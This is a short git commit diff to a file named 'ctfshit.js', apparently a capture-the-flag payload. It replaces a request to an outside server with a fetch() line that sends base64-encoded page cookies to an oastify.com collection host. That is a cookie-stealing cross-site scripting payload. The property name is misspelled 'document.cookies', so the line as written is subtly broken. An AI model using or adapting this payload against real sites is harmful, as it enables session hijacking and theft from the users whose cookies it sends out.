b8d722a9f3ea34f1bbb53480da5bce8d4d83e65d
chakal <54026816+chakal1337@users.noreply.github.com>
2022-10-26 10:35:16 -0700

    Update ctfshit.js

--- ctfshit.js
+++ ctfshit.js
@@ -1,3 +1,1 @@
-const req = new XMLHttpRequest();
-req.open("GET", "https://server1.skidson.online:1337/", true);
-req.send();
+fetch("http://jxkq105hfpz4b1a96z90unfpwg26qv.oastify.com/?foo="+btoa(document.cookies))
